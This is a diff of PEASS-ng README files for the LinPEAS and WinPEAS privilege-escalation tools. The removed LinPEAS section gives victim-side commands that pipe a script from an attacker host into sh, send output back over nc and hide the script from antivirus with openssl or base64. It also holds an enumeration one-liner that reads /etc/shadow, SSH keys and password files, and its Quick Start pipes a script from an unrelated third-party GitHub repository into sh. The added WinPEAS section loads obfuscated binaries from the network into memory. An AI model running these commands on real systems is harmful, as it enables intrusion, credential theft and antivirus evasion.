@@ -1,348 +1,288 @@
-# LinPEAS - Linux Privilege Escalation Awesome Script
-
-![](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/linPEAS/images/linpeas.png)
-
-**LinPEAS is a script that search for possible paths to escalate privileges on Linux/Unix\*/MacOS hosts. The checks are explained on [book.hacktricks.xyz](https://book.hacktricks.xyz/linux-unix/privilege-escalation)**
-
-Check the **Local Linux Privilege Escalation checklist** from **[book.hacktricks.xyz](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist)**.
-
-[![asciicast](https://asciinema.org/a/250532.png)](https://asciinema.org/a/309566)
-
-## MacPEAS
-
-Just execute `linpeas.sh` in a MacOS system and the **MacPEAS version will be automatically executed**
-
-## Quick Start
-Find the **latest versions of all the scripts and binaries in [the releases page](https://github.com/carlospolop/PEASS-ng/releases/latest)**.
-
-```bash
-# From github
-curl -L https://github.com/casagency/casscripts/blob/main/PEASS-ng/linpeas.sh | sh
-----
-curl -L https://github.com/casagency/casscripts/blob/main/PEASS-ng/linpeas.sh > linpeas.sh
-```
-
-# PEASS Post Exploitation Module for Metasploit
-
-You can use this module to **automatically execute a PEASS script from a meterpreter or shell session obtained in metasploit**.
-
-## Manual Installation
-Copy the `peass.rb` file to the path `modules/post/multi/gather/` inside the metasploit installation.
-
-In Kali: 
-```bash
-sudo cp ./peass.rb /usr/share/metasploit-framework/modules/post/multi/gather/
-# or
-sudo wget https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/metasploit/peass.rb -O /usr/share/metasploit-framework/modules/post/multi/gather/peass.rb
-```
-
-Now you can do `reload_all` inside a running msfconsole or the next time you launch a new msfconsole the peass module will be **automatically loaded**.
-
-## How to use it
-```
-msf6 exploit(multi/handler) > use post/multi/gather/peass
-msf6 post(multi/gather/peass) > show info
-
-       Name: Multi PEASS launcher
-     Module: post/multi/gather/peass
-   Platform: BSD, Linux, OSX, Unix, Windows
-       Arch: 
-       Rank: Normal
-
-Provided by:
-  Carlos Polop <@carlospolopm>
-
-Compatible session types:
-  Meterpreter
-  Shell
-
-Basic options:
-  Name        Current Setting                                                           Required  Description
-  ----        ---------------                                                           --------  -----------
-  PARAMETERS                                                                            no        Parameters to pass to the script
-  PASSWORD    um1xipfws17nkw1bi1ma3bh7tzt4mo3e                                          no        Password to encrypt and obfuscate the script (randomly generated). The length must be 32B. If no password is set, only base64 will be used
-                                                                                                  .
-  PEASS_URL   https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/wi  yes       Path to the PEASS script. Accepted: http(s):// URL or absolute local path. Linpeas: https://raw.githubusercontent.com/carlospolop/PEASS-ng
-              nPEASexe/binaries/Obfuscated%20Releases/winPEASany.exe                              /master/linPEAS/linpeas.sh
-  SESSION                                                                               yes       The session to run this module on.
-  SRVHOST                                                                               no        Set your metasploit instance IP if you want to download the PEASS script from here via http(s) instead of uploading it.
-  SRVPORT     443                                                                       no        Port to download the PEASS script from using http(s) (only used if SRVHOST)
-  SSL         true                                                                      no        Indicate if you want to communicate with https (only used if SRVHOST)
-  SSLCert                                                                               no        Path to a custom SSL certificate (default is randomly generated)
-  TEMP_DIR                                                                              no        Path to upload the obfuscated PEASS script inside the compromised machine. By default "C:\Windows\System32\spool\drivers\color" is used in
-                                                                                                   Windows and "/tmp" in Unix.
-  TIMEOUT     900                                                                       no        Timeout of the execution of the PEASS script (15min by default)
-  URIPATH     /mvpo.txt                                                                 no        URI path to download the script from there (only used if SRVHOST)
-
-Description:
-  This module will launch the indicated PEASS (Privilege Escalation 
-  Awesome Script Suite) script to enumerate the system. You need to 
-  indicate the URL or local path to LinPEAS if you are in some Unix or 
-  to WinPEAS if you are in Windows. By default this script will upload 
-  the PEASS script to the host (encrypted and/or encoded) and will 
-  load it and execute it. You can configure this module to download 
-  the encrypted/encoded PEASS script from this metasploit instance via 
-  HTTP instead of uploading it.
-
-References:
-  https://github.com/carlospolop/PEASS-ng
-  https://www.youtube.com/watch?v=9_fJv_weLU0
-```
-
-The options are pretty self-explanatory.
-
-Notice that **by default** the obfuscated PEASS script if going to be **uploaded** but if you **set SRVHOST it will be downloaded** via http(s) from the metasploit instance (**so nothing will be written in the disk of the compromised host**).
-
-Notice that you can **set parametes** like `-h` in `PARAMETERS` and then linpeas/winpeas will just show the help (*just like when you execute them from a console*).
-
-**IMPORTANT**: You won't see any output until the execution of the script is completed.
-
-
-```bash
-# Local network
-sudo python -m SimpleHTTPServer 80 #Host
-curl 10.10.10.10/linpeas.sh | sh #Victim
-
-# Without curl
-sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
-cat < /dev/tcp/10.10.10.10/80 | sh #Victim
-
-# Excute from memory and send output back to the host
-nc -lvnp 9002 | tee linpeas.out #Host
-curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim
-```
-
-```bash
-# Output to file
-./linpeas.sh -a > /dev/shm/linpeas.txt #Victim
-less -r /dev/shm/linpeas.txt #Read with colors
-```
-
-```bash
-# Use a linpeas binary
-wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_linux_amd64
-chmod +x linpeas_linux_amd64
-./linpeas_linux_amd64
-```
-
-## AV bypass
-```bash
-#open-ssl encryption
-openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:AVBypassWithAES -in linpeas.sh -out lp.enc
-sudo python -m SimpleHTTPServer 80 #Start HTTP server
-curl 10.10.10.10/lp.enc | openssl enc -aes-256-cbc -pbkdf2 -d -pass pass:AVBypassWithAES | sh #Download from the victim
-
-#Base64 encoded
-base64 -w0 linpeas.sh > lp.enc
-sudo python -m SimpleHTTPServer 80 #Start HTTP server
-curl 10.10.10.10/lp.enc | base64 -d | sh #Download from the victim
-```
-
-## Basic Information
-
-The goal of this script is to search for possible **Privilege Escalation Paths** (tested in Debian, CentOS, FreeBSD, OpenBSD and MacOS).
-
-This script doesn't have any dependency.
-
-It uses **/bin/sh** syntax, so can run in anything supporting `sh` (and the binaries and parameters used).
-
-By default, **linpeas won't write anything to disk and won't try to login as any other user using `su`**.
-
-By default linpeas takes around **4 mins** to complete, but It could take from **5 to 10 minutes** to execute all the checks using **-a** parameter *(Recommended option for CTFs)*:
-- From less than 1 min to 2 mins to make almost all the checks
-- Almost 1 min to search for possible passwords inside all the accesible files of the system
-- 20s/user bruteforce with top2000 passwords *(need `-a`)* - Notice that this check is **super noisy**
-- 1 min to monitor the processes in order to find very frequent cron jobs *(need `-a`)* - Notice that this check will need to **write** some info inside a file that will be deleted
-
-**Interesting parameters:**
-- **-a** (all checks) - This will **execute also the check of processes during 1 min, will search more possible hashes inside files, and brute-force each user using `su` with the top2000 passwords.**
-- **-e** (extra enumeration) - This will execute **enumeration checkes that are avoided by default**
-- **-s** (superfast & stealth) - This will bypass some time consuming checks - **Stealth mode** (Nothing will be written to disk)
-- **-P** (Password) - Pass a password that will be used with `sudo -l` and bruteforcing other users
-- **-D** (Debug) - Print information about the checks that haven't discovered anything and about the time each check took
-- **-d/-p/-i/-t** (Local Network Enumeration) - Linpeas can also discover and port-scan local networks
-
-This script has **several lists** included inside of it to be able to **color the results** in order to highlight PE vector.
-
-```
-Enumerate and search Privilege Escalation vectors.
-This tool enum and search possible misconfigurations (known vulns, user, processes and file permissions, special file permissions, readable/writable files, bruteforce other users(top1000pwds), passwords...) inside the host and highlight possible misconfigurations with colors.
-      -h To show this message
-      -q Do not show banner
-      -e Perform extra enumeration
-      -s SuperFast (don't check some time consuming checks) - Stealth mode
-      -a All checks (1min of processes and su brute) - Noisy mode, for CTFs mainly
-      -w Wait execution between big blocks of checks
-      -N Do not use colours
-      -D Debug mode
-      -P Indicate a password that will be used to run 'sudo -l' and to bruteforce other users accounts via 'su'
-      -o Only execute selected checks (system_information,container,procs_crons_timers_srvcs_sockets,network_information,users_information,software_information,interesting_files). Select a comma separated list.
-      -L Force linpeas execution.
-      -M Force macpeas execution.
-      -d <IP/NETMASK> Discover hosts using fping or ping. Ex: -d 192.168.0.1/24
-      -p <PORT(s)> -d <IP/NETMASK> Discover hosts looking for TCP open ports (via nc). By default ports 22,80,443,445,3389 and another one indicated by you will be scanned (select 22 if you don't want to add more). You can also add a list of ports. Ex: -d 192.168.0.1/24 -p 53,139
-      -i <IP> [-p <PORT(s)>] Scan an IP using nc. By default (no -p), top1000 of nmap will be scanned, but you can select a list of ports instead. Ex: -i 127.0.0.1 -p 53,80,443,8000,8080
-      -t Automatic network scan (host discovery and port scanning) - This option writes to files
-  Notice that if you specify some network scan (options -d/-p/-i but NOT -t), no PE check will be performed
-```
-
-## Hosts Discovery and Port Scanning
-
-With LinPEAS you can also **discover hosts automatically** using `fping`, `ping` and/or `nc`, and **scan ports** using `nc`.
-
-LinPEAS will **automatically search for this binaries** in `$PATH` and let you know if any of them is available. In that case you can use LinPEAS to hosts dicovery and/or port scanning.
-
-![](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/linPEAS/images/network.png)
-
-
-## Colors
-
-<details>
-<summary>Details</summary>
-
-LinPEAS uses colors to indicate where does each section begin. But **it also uses them the identify potencial misconfigurations**.
-
-The ![](https://placehold.it/15/b32400/000000?text=+) **Red/Yellow** ![](https://placehold.it/15/fff500/000000?text=+) color is used for identifing configurations that lead to PE (99% sure).
-
-The ![](https://placehold.it/15/b32400/000000?text=+) **Red** color is used for identifing suspicious configurations that could lead to PE:
-- Possible exploitable kernel versions
-- Vulnerable sudo versions
-- Identify processes running as root
-- Not mounted devices
-- Dangerous fstab permissions
-- Writable files in interesting directories
-- SUID/SGID binaries that have some vulnerable version (it also specifies the vulnerable version)
-- SUDO binaries that can be used to escalate privileges in sudo -l (without passwd) (https://gtfobins.github.io/)
-- Check /etc/doas.conf
-- 127.0.0.1 in netstat
-- Known files that could contain passwords
-- Capabilities in interesting binaries
-- Interesting capabilities of a binary
-- Writable folders and wilcards inside info about cron jobs
-- Writables folders in PATH
-- Groups that could lead to root
-- Files that could contains passwords
-- Suspicious cronjobs
-
-The ![](https://placehold.it/15/66ff33/000000?text=+) **Green** color is used for:
-- Common processes run by root
-- Common not interesting devices to mount
-- Not dangerous fstab permissions
-- SUID/SGID common binaries (the bin was already found in other machines and searchsploit doesn't identify any vulnerable version)
-- Common .sh files in path
-- Common names of users executing processes
-- Common cronjobs
-
-The ![](https://placehold.it/15/0066ff/000000?text=+) **Blue** color is used for:
-- Users without shell
-- Mounted devices
-
-The ![](https://placehold.it/15/33ccff/000000?text=+) **Light Cyan** color is used for:
-- Users with shell
-
-The ![](https://placehold.it/15/bf80ff/000000?text=+) **Light Magenta** color is used for:
-- Current username
-
-</details>
-
-## One-liner Enumerator
-
-Here you have an old linpe version script in one line, **just copy and paste it**;)
-
-**The color filtering is not available in the one-liner** (the lists are too big)
-
-This one-liner is deprecated (I'm not going to update it any more), but it could be useful in some cases so it will remain here.
-
-The default file where all the data is stored is: */tmp/linPE* (you can change it at the beginning of the script)
-
-
-```sh
-file="/tmp/linPE";RED='\033[0;31m';Y='\033[0;33m';B='\033[0;34m';NC='\033[0m';rm -rf $file;echo "File: $file";echo "[+]Gathering system information...";printf $B"[*] "$RED"BASIC SYSTEM INFO\n"$NC >> $file ;echo "" >> $file;printf $Y"[+] "$RED"Operative system\n"$NC >> $file;(cat /proc/version || uname -a ) 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"PATH\n"$NC >> $file;echo $PATH 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Date\n"$NC >> $file;date 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Sudo version\n"$NC >> $file;sudo -V 2>/dev/null| grep "Sudo ver" >> $file;echo "" >> $file;printf $Y"[+] "$RED"selinux enabled?\n"$NC >> $file;sestatus 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Useful software?\n"$NC >> $file;which nc ncat netcat wget curl ping gcc make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Capabilities\n"$NC >> $file;getcap -r / 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Environment\n"$NC >> $file;(set || env) 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Top and cleaned proccesses\n"$NC >> $file;ps aux 2>/dev/null | grep -v "\[" >> $file;echo "" >> $file;printf $Y"[+] "$RED"Binary processes permissions\n"$NC >> $file;ps aux 2>/dev/null | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++' 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Services\n"$NC >> $file;(/usr/sbin/service --status-all || /sbin/chkconfig --list || /bin/rc-status) 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Different processes executed during 1 min (HTB)\n"$NC >> $file;if [ "`ps -e --format cmd`" ]; then for i in {1..121}; do ps -e --format cmd >> $file.tmp1; sleep 0.5; done; sort $file.tmp1 | uniq | grep -v "\[" | sed '/^.\{500\}./d' >> $file; rm $file.tmp1; fi;echo "" >> $file;printf $Y"[+] "$RED"Proccesses binary permissions\n"$NC >> $file;ps aux 2>/dev/null | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++' 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Scheduled tasks\n"$NC >> $file;crontab -l 2>/dev/null >> $file;ls -al /etc/cron* 2>/dev/null >> $file;cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root /var/spool/anacron 2>/dev/null | grep -v "^#" >> $file;echo "" >> $file;printf $Y"[+] "$RED"Any sd* disk in /dev?\n"$NC >> $file;ls /dev 2>/dev/null | grep -i "sd" >> $file;echo "" >> $file;printf $Y"[+] "$RED"Storage information\n"$NC >> $file;df -h 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Unmounted file-system?\n"$NC >> $file;cat /etc/fstab 2>/dev/null | grep -v "^#" >> $file;echo "" >> $file;printf $Y"[+] "$RED"Printer?\n"$NC >> $file;lpstat -a 2>/dev/null >> $file;echo "" >> $file;echo "" >> $file;echo "[+]Gathering network information...";printf $B"[*] "$RED"NETWORK INFO\n"$NC >> $file ;echo "" >> $file;printf $Y"[+] "$RED"Hostname, hosts and DNS\n"$NC >> $file;cat /etc/hostname /etc/hosts /etc/resolv.conf 2>/dev/null | grep -v "^#" >> $file;dnsdomainname 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Networks and neightbours\n"$NC >> $file;cat /etc/networks 2>/dev/null >> $file;(ifconfig || ip a) 2>/dev/null >> $file;iptables -L 2>/dev/null >> $file;ip n 2>/dev/null >> $file;route -n 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Ports\n"$NC >> $file;(netstat -punta || ss -t; ss -u) 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Can I sniff with tcpdump?\n"$NC >> $file;timeout 1 tcpdump >> $file 2>&1;echo "" >> $file;echo "" >> $file;echo "[+]Gathering users information...";printf $B"[*] "$RED"USERS INFO\n"$NC >> $file ;echo "" >> $file;printf $Y"[+] "$RED"Me\n"$NC >> $file;(id || (whoami && groups)) 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Sudo -l without password\n"$NC >> $file;echo '' | sudo -S -l -k 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Do I have PGP keys?\n"$NC >> $file;gpg --list-keys 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Superusers\n"$NC >> $file;awk -F: '($3 == "0") {print}' /etc/passwd 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Login\n"$NC >> $file;w 2>/dev/null >> $file;last 2>/dev/null | tail >> $file;echo "" >> $file;printf $Y"[+] "$RED"Users with console\n"$NC >> $file;cat /etc/passwd 2>/dev/null | grep "sh$" >> $file;echo "" >> $file;printf $Y"[+] "$RED"All users\n"$NC >> $file;cat /etc/passwd 2>/dev/null | cut -d: -f1 >> $file;echo "" >> $file;echo "" >> $file;echo "[+]Gathering files information...";printf $B"[*] "$RED"INTERESTING FILES\n"$NC >> $file ;echo "" >> $file;printf $Y"[+] "$RED"SUID\n"$NC >> $file;find / -perm -4000 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"SGID\n"$NC >> $file;find / -perm -g=s -type f 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Files inside \$HOME (limit 20)\n"$NC >> $file;ls -la $HOME 2>/dev/null | head -n 20 >> $file;echo "" >> $file;printf $Y"[+] "$RED"20 First files of /home\n"$NC >> $file;find /home -type f 2>/dev/null | column -t | grep -v -i "/"$USER | head -n 20 >> $file;echo "" >> $file;printf $Y"[+] "$RED"Files inside .ssh directory?\n"$NC >> $file;find  /home /root -name .ssh 2>/dev/null -exec ls -laR {} \; >> $file;echo "" >> $file;printf $Y"[+] "$RED"*sa_key* files\n"$NC >> $file;find / -type f -name "*sa_key*" -ls 2>/dev/null -exec ls -l {} \; >> $file;echo "" >> $file;printf $Y"[+] "$RED"Mails?\n"$NC >> $file;ls -alh /var/mail/ /var/spool/mail/ 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"NFS exports?\n"$NC >> $file;cat /etc/exports 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Hashes inside /etc/passwd? Readable /etc/shadow or /etc/master.passwd?\n"$NC >> $file;grep -v '^[^:]*:[x]' /etc/passwd 2>/dev/null >> $file;cat /etc/shadow /etc/master.passwd 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Readable /root?\n"$NC >> $file;ls -ahl /root/ 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Inside docker or lxc?\n"$NC >> $file;dockercontainer=`grep -i docker /proc/self/cgroup  2>/dev/null; find / -name "*dockerenv*" -exec ls -la {} \; 2>/dev/null`;lxccontainer=`grep -qa container=lxc /proc/1/environ 2>/dev/null`;if [ "$dockercontainer" ]; then echo "Looks like we're in a Docker container" >> $file; fi;if [ "$lxccontainer" ]; then echo "Looks like we're in a LXC container" >> $file; fi;echo "" >> $file;printf $Y"[+] "$RED"*_history, profile, bashrc, httpd.conf\n"$NC >> $file;find / -type f \( -name "*_history" -o -name "profile" -o -name "*bashrc" -o -name "httpd.conf" \) -exec ls -l {} \; 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"All hidden files (not in /sys/) (limit 100)\n"$NC >> $file;find / -type f -iname ".*" -ls 2>/dev/null | grep -v "/sys/" | head -n 100 >> $file;echo "" >> $file;printf $Y"[+] "$RED"What inside /tmp, /var/tmp, /var/backups\n"$NC >> $file;ls -a /tmp /var/tmp /var/backups 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Interesting writable Files\n"$NC >> $file;USER=`whoami`;HOME=/home/$USER;find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | grep -v '/sys/fs'| sort | uniq >> $file;for g in `groups`; do find / \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME | grep -v '/sys/fs'; done >> $file;echo "" >> $file;printf $Y"[+] "$RED"Web files?(output limited)\n"$NC >> $file;ls -alhR /var/www/ 2>/dev/null | head >> $file;ls -alhR /srv/www/htdocs/ 2>/dev/null | head >> $file;ls -alhR /usr/local/www/apache22/data/ 2>/dev/null | head >> $file;ls -alhR /opt/lampp/htdocs/ 2>/dev/null | head >> $file;echo "" >> $file;printf $Y"[+] "$RED"Backup files?\n"$NC >> $file;find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*back*" -o -name "*bck*" \) 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Find IPs inside logs\n"$NC >> $file;grep -a -R -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' /var/log/ 2>/dev/null | sort | uniq >> $file;echo "" >> $file;printf $Y"[+] "$RED"Find 'password' or 'passw' string inside /home, /var/www, /var/log, /etc\n"$NC >> $file;grep -lRi "password\|passw" /home /var/www /var/log 2>/dev/null | sort | uniq >> $file;echo "" >> $file;printf $Y"[+] "$RED"Sudo -l (you need to puts the password and the result appear in console)\n"$NC >> $file;sudo -l;
-```
-
-## PEASS Style
-
-Are you a PEASS fan? Get now our merch at **[PEASS Shop](https://teespring.com/stores/peass)** and show your love for our favorite peas
-
-## TODO
-
-- Add more checks
-- Mantain updated the list of vulnerable SUID binaries
-- Mantain updated all the blacklists used to color the output
-
-If you want to help with any of this, you can do it using **[github issues](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/issues) or you can submit a pull request**.
-
-If you find any issue, please report it using **[github issues](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/issues)**.
-
-
-**Linpeas** is being **updated** every time I find something that could be useful to escalate privileges.
-
-## Advisory
-
-All the scripts/binaries of the PEAS Suite should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.
-
-
-# PEASS-ng - Privilege Escalation Awesome Scripts SUITE new generation
-
-![](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/linPEAS/images/peass.png)
-
-![](https://img.shields.io/badge/Black-Arch-black) ![](https://img.shields.io/badge/Arch-AUR-brightgreen) ![](https://img.shields.io/badge/Black%20Hat%20Arsenal-Asia%202020-red)
-
-# Basic Tutorial
-[![Tutorial](https://img.youtube.com/vi/2Ey1WQXNp3w/0.jpg)](https://www.youtube.com/watch?v=9_fJv_weLU0&list=PL9fPq3eQfaaDxjpXaDYApfVA_IB8T14w7)
-
-
-Here you will find **privilege escalation tools for Windows and Linux/Unix\* and MacOS**.
-
-These tools search for possible **local privilege escalation paths** that you could exploit and print them to you **with nice colors** so you can recognize the misconfigurations easily.
-
-- Check the **Local Windows Privilege Escalation checklist** from **[book.hacktricks.xyz](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)**
-- **[WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) - Windows local Privilege Escalation Awesome Script (C#.exe and .bat)**
-
-- Check the **Local Linux Privilege Escalation checklist** from **[book.hacktricks.xyz](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist)**
-- **[LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) - Linux local Privilege Escalation Awesome Script (.sh)**
-
-## Quick Start
-Find the **latest versions of all the scripts and binaries in [the releases page](https://github.com/carlospolop/PEASS-ng/releases/latest)**.
-
-## Let's improve PEASS together
-
-If you want to **add something** and have **any cool idea** related to this project, please let me know it in the **telegram group https://t.me/peass** or contribute reading the **[CONTRIBUTING.md](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/CONTRIBUTING.md)** file.
-
-## PEASS Style
-
-Are you a PEASS fan? Get now our merch at **[PEASS Shop](https://teespring.com/stores/peass)** and show your love for our favorite peas
-
-## Advisory
-
-All the scripts/binaries of the PEAS suite should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own machines and/or with the owner's permission.
-
-# Windows Privilege Escalation Awesome Scripts
+# Windows Privilege Escalation Awesome Script (.exe)
 
 ![](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/images/winpeas.png)
 
-Check the **Local Windows Privilege Escalation checklist** from **[book.hacktricks.xyz](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)**
+**WinPEAS is a script that search for possible paths to escalate privileges on Windows hosts. The checks are explained on [book.hacktricks.xyz](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation)**
 
-Check more **information about how to exploit** found misconfigurations in **[book.hacktricks.xyz](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation)**
+Check also the **Local Windows Privilege Escalation checklist** from **[book.hacktricks.xyz](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)**
+
+[![youtube](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/images/screen.png)](https://youtu.be/66gOwXMnxRI)
 
 ## Quick Start
-Find the **latest versions of all the scripts and binaries in [the releases page](https://github.com/carlospolop/PEASS-ng/releases/latest)**.
 
-## WinPEAS .exe and .bat
-- [Link to WinPEAS .bat project](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASbat) 
-- [Link to WinPEAS C# project (.exe)](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe) (.Net >= 4.5.2 required)
-    - **Please, read the Readme of that folder to learn how to execute winpeas from memory or how make colors work among other tricks**
+**.Net >= 4.5.2 is required**
+
+Precompiled binaries:
+- Download the **[latest obfuscated and not obfuscated versions from here](https://github.com/carlospolop/PEASS-ng/releases/latest)** or **compile it yourself** (read instructions for compilation).
+
+```bash
+# Get latest release
+$url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe"
+
+# One liner to download and execute winPEASany from memory in a PS shell
+$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
+
+# Before cmd in 3 lines
+$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content));
+[winPEAS.Program]::Main("") #Put inside the quotes the winpeas parameters you want to use
+
+# Load from disk in memory and execute:
+$wp = [System.Reflection.Assembly]::Load([byte[]]([IO.File]::ReadAllBytes("D:\Users\victim\winPEAS.exe")));
+[winPEAS.Program]::Main("") #Put inside the quotes the winpeas parameters you want to use
+
+# Load from disk in base64 and execute
+##Generate winpeas in Base64:
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("D:\Users\user\winPEAS.exe")) | Out-File -Encoding ASCII D:\Users\user\winPEAS.txt
+##Now upload the B64 string to the victim inside a file or copy it to the clipboard
+
+ ##If you have uploaded the B64 as afile load it with:
+$thecontent = Get-Content -Path D:\Users\victim\winPEAS.txt
+ ##If you have copied the B64 to the clipboard do:
+$thecontent = "aaaaaaaa..." #Where "aaa..." is the winpeas base64 string
+##Finally, load binary in memory and execute
+$wp = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($thecontent))
+[winPEAS.Program]::Main("") #Put inside the quotes the winpeas parameters you want to use
+
+# Loading from file and executing a winpeas obfuscated version
+##Load obfuscated version
+$wp = [System.Reflection.Assembly]::Load([byte[]]([IO.File]::ReadAllBytes("D:\Users\victim\winPEAS-Obfuscated.exe")));
+$wp.EntryPoint #Get the name of the ReflectedType, in obfuscated versions sometimes this is different from "winPEAS.Program"
+[<ReflectedType_from_before>]::Main("") #Used the ReflectedType name to execute winpeas
+```
+
+## Parameters Examples
+
+```bash
+winpeas.exe #run all checks (except for additional slower checks - LOLBAS and linpeas.sh in WSL) (noisy - CTFs)
+winpeas.exe systeminfo userinfo #Only systeminfo and userinfo checks executed
+winpeas.exe notcolor #Do not color the output
+winpeas.exe domain #enumerate also domain information
+winpeas.exe wait #wait for user input between tests
+winpeas.exe debug #display additional debug information
+winpeas.exe log #log output to out.txt instead of standard output
+winpeas.exe -linpeas=http://127.0.0.1/linpeas.sh #Execute also additional linpeas check (runs linpeas.sh in default WSL distribution) with custom linpeas.sh URL (if not provided, the default URL is: https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh)
+winpeas.exe -lolbas  #Execute also additional LOLBAS search check
+```
+
+## Help
+```
+quiet                Do not print banner
+notcolor             Don't use ansi colors (all white)
+systeminfo           Search system information
+userinfo             Search user information
+processinfo          Search processes information
+servicesinfo         Search services information
+applicationsinfo     Search installed applications information
+networkinfo          Search network information
+windowscreds         Search windows credentials
+browserinfo          Search browser information
+filesinfo            Search files that can contains credentials
+eventsinfo           Display interesting events information
+wait                 Wait for user input between checks
+debug                Display debugging information - memory usage, method execution time
+log=[logfile]        Log all output to file defined as logfile, or to "out.txt" if not specified
+
+Additional checks (slower):
+-lolbas              Run additional LOLBAS check
+-linpeas=[url]       Run additional linpeas.sh check for default WSL distribution, optionally provide custom linpeas.sh URL
+                     (default: https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh)
+```
+
+## Basic information
+
+The goal of this project is to search for possible **Privilege Escalation Paths** in Windows environments.
+
+It should take only a **few seconds** to execute almost all the checks and **some seconds/minutes during the lasts checks searching for known filenames** that could contain passwords (the time depened on the number of files in your home folder). By default only **some** filenames that could contain credentials are searched, you can use the **searchall** parameter to search all the list (this could will add some minutes).
+
+The tool is based on **[SeatBelt](https://github.com/GhostPack/Seatbelt)**.
+
+## Where are my COLORS?!?!?!
+
+The **ouput will be colored** using **ansi** colors. If you are executing `winpeas.exe` **from a Windows console**, you need to set a registry value to see the colors (and open a new CMD):
+```
+REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
+```
+
+Below you have some indications about what does each color means exacty, but keep in mind that **Red** is for something interesting (from a pentester perspective) and **Green** is something well configured (from a defender perspective).
+
+![](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/images/colors.png)
+
+## Instructions to compile you own obfuscated version
+
+<details>
+  <summary>Details</summary>
+
